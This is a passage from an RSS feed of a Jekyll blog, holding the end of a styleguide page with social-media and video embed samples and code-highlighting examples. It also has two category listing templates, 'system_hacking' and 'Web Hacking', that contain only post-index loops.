553.369,79.82 C556.562,79.673 558.743,79.167 560.652,78.425 C562.623,77.658 564.297,76.634 565.965,74.965 C567.633,73.296 568.659,71.625 569.425,69.651 C570.167,67.743 570.674,65.562 570.82,62.369 C570.966,59.17 571,58.147 571,50 C571,41.851 570.966,40.831 570.82,37.631&quot;&gt;&lt;/path&gt;&lt;/g&gt;&lt;/g&gt;&lt;/g&gt;&lt;/svg&gt;&lt;/div&gt;&lt;div style=&quot;padding-top: 8px;&quot;&gt; &lt;div style=&quot; color:#3897f0; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:550; line-height:18px;&quot;&gt; View this post on Instagram&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot;padding: 12.5% 0;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;display: flex; flex-direction: row; margin-bottom: 14px; align-items: center;&quot;&gt;&lt;div&gt; &lt;div style=&quot;background-color: #F4F4F4; border-radius: 50%; height: 12.5px; width: 12.5px; transform: translateX(0px) translateY(7px);&quot;&gt;&lt;/div&gt; &lt;div style=&quot;background-color: #F4F4F4; height: 12.5px; transform: rotate(-45deg) translateX(3px) translateY(1px); width: 12.5px; flex-grow: 0; margin-right: 14px; margin-left: 2px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot;background-color: #F4F4F4; border-radius: 50%; height: 12.5px; width: 12.5px; transform: translateX(9px) translateY(-18px);&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot;margin-left: 8px;&quot;&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 50%; flex-grow: 0; height: 20px; width: 20px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot; width: 0; height: 0; border-top: 2px solid transparent; border-left: 6px solid #f4f4f4; border-bottom: 2px solid transparent; transform: translateX(16px) translateY(-4px) rotate(30deg)&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;div style=&quot;margin-left: auto;&quot;&gt; &lt;div style=&quot; width: 0px; border-top: 8px solid #F4F4F4; border-right: 8px solid transparent; transform: translateY(16px);&quot;&gt;&lt;/div&gt; &lt;div style=&quot; background-color: #F4F4F4; flex-grow: 0; height: 12px; width: 16px; transform: translateY(-4px);&quot;&gt;&lt;/div&gt; &lt;div style=&quot; width: 0; height: 0; border-top: 8px solid #F4F4F4; border-left: 8px solid transparent; transform: translateY(-4px) translateX(8px);&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt; &lt;div style=&quot;display: flex; flex-direction: column; flex-grow: 1; justify-content: center; margin-bottom: 24px;&quot;&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; margin-bottom: 6px; width: 224px;&quot;&gt;&lt;/div&gt; &lt;div style=&quot; background-color: #F4F4F4; border-radius: 4px; flex-grow: 0; height: 14px; width: 144px;&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/a&gt;&lt;p style=&quot; color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; line-height:17px; margin-bottom:0; margin-top:8px; overflow:hidden; padding:8px 0 7px; text-align:center; text-overflow:ellipsis; white-space:nowrap;&quot;&gt;&lt;a href=&quot;https://www.instagram.com/p/CBXO7AypXkM/?utm_source=ig_embed&amp;amp;utm_campaign=loading&quot; style=&quot; color:#c9c8cd; font-family:Arial,sans-serif; font-size:14px; font-style:normal; font-weight:normal; line-height:17px; text-decoration:none;&quot; target=&quot;_blank&quot;&gt;A post shared by Sujay (@sujaykundu777)&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;&lt;/blockquote&gt; &lt;script async src=&quot;//www.instagram.com/embed.js&quot;&gt;&lt;/script&gt;

&lt;hr&gt;

&lt;h3&gt; Twitter Embed &lt;/h3&gt;

&lt;blockquote class=&quot;twitter-tweet&quot; data-lang=&quot;en&quot;&gt;&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;I just published “Deploying a blog using Jekyll and Github Pages with SSL certificate for Free” &lt;a href=&quot;https://t.co/B3T3IQVU93&quot;&gt;https://t.co/B3T3IQVU93&lt;/a&gt;&lt;/p&gt;&amp;mdash; Sujay Kundu (@SujayKundu777) &lt;a href=&quot;https://twitter.com/SujayKundu777/status/1012601950469160962?ref_src=twsrc%5Etfw&quot;&gt;June 29, 2018&lt;/a&gt;&lt;/blockquote&gt;
&lt;script async src=&quot;https://platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;

&lt;hr /&gt;


&lt;h3&gt;YouTube Responsive Embed&lt;/h3&gt;

&lt;iframe width=&quot;560&quot; height=&quot;315&quot; src=&quot;https://www.youtube.com/embed/bBpKMH3nBzE?rel=0&amp;amp;controls=0&amp;amp;showinfo=0&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot; allowfullscreen&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h3&gt;Vimeo Responsive Embed&lt;/h3&gt;

&lt;iframe src=&quot;https://player.vimeo.com/video/212114694?title=0&amp;amp;byline=0&amp;amp;portrait=0&quot; width=&quot;640&quot; height=&quot;360&quot; frameborder=&quot;0&quot; webkitallowfullscreen=&quot;&quot; mozallowfullscreen=&quot;&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;ted-responsive-embed&quot;&gt;TED Responsive Embed&lt;/h3&gt;

&lt;iframe src=&quot;https://embed.ted.com/talks/ted_halstead_a_climate_solution_where_all_sides_can_win&quot; width=&quot;640&quot; height=&quot;360&quot; frameborder=&quot;0&quot; scrolling=&quot;no&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;twitch-responsive-embed&quot;&gt;Twitch Responsive Embed&lt;/h3&gt;

&lt;iframe src=&quot;https://player.twitch.tv/?autoplay=false&amp;amp;video=v248755437&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;true&quot; scrolling=&quot;no&quot; height=&quot;378&quot; width=&quot;620&quot;&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;soundcloud-embed&quot;&gt;SoundCloud Embed&lt;/h3&gt;

&lt;iframe width=&quot;100%&quot; height=&quot;166&quot; scrolling=&quot;no&quot; frameborder=&quot;no&quot; src=&quot;https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/29738591&amp;amp;color=ff5500&amp;amp;auto_play=false&amp;amp;hide_related=false&amp;amp;show_comments=true&amp;amp;show_user=true&amp;amp;show_reposts=false&quot;&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;codepen-embed&quot;&gt;CodePen Embed&lt;/h3&gt;

&lt;p data-height=&quot;265&quot; data-theme-id=&quot;light&quot; data-slug-hash=&quot;YWvpRo&quot; data-default-tab=&quot;css,result&quot; data-user=&quot;kharrop&quot; data-embed-version=&quot;2&quot; data-pen-title=&quot;Referral Form&quot; class=&quot;codepen&quot;&gt;&lt;/p&gt;
&lt;script async=&quot;&quot; src=&quot;https://production-assets.codepen.io/assets/embed/ei.js&quot;&gt;&lt;/script&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;syntax-highlighting&quot;&gt;Syntax Highlighting&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot; data-lang=&quot;js&quot;&gt;&lt;span class=&quot;s1&quot;&gt;&apos;use strict&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;markdown&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;require&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;markdown&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;markdown&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Editor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;preview&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;update&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;preview&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;innerHTML&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;markdown&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;toHTML&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;value&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
  &lt;span class=&quot;nx&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;editor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;You can add inline code just like this, E.g. &lt;code class=&quot;highlighter-rouge&quot;&gt;.code { color: #fff; }&lt;/code&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-css&quot; data-lang=&quot;css&quot;&gt;&lt;span class=&quot;nt&quot;&gt;pre&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;nl&quot;&gt;background-color&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;#f4f4f4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nl&quot;&gt;max-width&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;100%&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;nl&quot;&gt;overflow&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;auto&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;github-gist-embed&quot;&gt;GitHub gist Embed&lt;/h3&gt;

&lt;script src=&quot;https://gist.github.com/ahmadajmi/dbb4f713317721668bcbc39420562afc.js&quot;&gt;&lt;/script&gt;

&lt;hr /&gt;

&lt;h3 id=&quot;input-style&quot;&gt;Input Style&lt;/h3&gt;

&lt;p&gt;&lt;input type=&quot;text&quot; placeholder=&quot;I&apos;m an input field!&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;


</description>
            <link>https://touBVa.github.io/styleguide/</link>
          </item>
        
      
    
      
        
          <item>
            <title>system_hacking</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.system_hacking %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>https://touBVa.github.io/blog/categories/system_hacking/</link>
          </item>
        
      
    
      
        
          <item>
            <title>Web Hacking</title>
            <description>&lt;h5&gt; Posts by Category : {{ page.title }} &lt;/h5&gt;

&lt;div class=&quot;card&quot;&gt;
{% for post in site.categories.web_hacking %}
 &lt;li class=&quot;category-posts&quot;&gt;&lt;span&gt;{{ post.date | date_to_string }}&lt;/span&gt; &amp;nbsp; &lt;a href=&quot;{{ post.url }}&quot;&gt;{{ post.title }}&lt;/a&gt;&lt;/li&gt;
{% endfor %}
&lt;/div&gt;</description>
            <link>https://touBVa.github.io/blog/categories/web_hacking/</link>
          </item>
        
      
    
      
    
      
    

  </channel>
</rss>